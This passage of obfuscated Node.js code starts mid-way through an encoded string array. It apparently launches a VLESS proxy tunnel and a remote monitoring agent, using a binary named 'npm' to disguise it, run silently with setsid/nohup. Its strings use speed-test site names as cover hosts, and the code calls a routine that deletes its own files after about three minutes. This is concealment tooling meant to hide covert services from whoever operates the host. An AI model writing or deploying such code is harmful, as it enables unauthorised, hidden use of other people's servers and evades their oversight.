ask\x20added\x20successfully','isp','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','type','sha224','createHash','4008QQbWBD','testmy.net','your-domain.com','Server','librespeed.org','index.html','Failed\x20to\x20resolve\x20','16903250RrUiIq','PORT','log','readUInt16BE','org','Answer','vless://','https://api-ipv4.ip.sb/ip','https://dns.google/resolve?name=','data','npm','Unknown','none','speedcheck.org','application/json','toLowerCase','reduce','countryCode','end','Server\x20is\x20running\x20on\x20port\x20','unlink','includes','close','net','fast.com','false','buffer','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','cahnge-your-domain.com','send','&fp=chrome&type=ws&host=','createServer','substr','config.yaml'];_0x304a=function(){return _0x58586d;};return _0x304a();}httpServer[_0x30a9fd(0x1cf)](PORT,()=>{const _0x18e777={_0x2a7aba:0x1f5},_0xd2ec34=_0x30a9fd;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xd2ec34(0x1e4)](_0xd2ec34(_0x18e777._0x2a7aba)+PORT);});
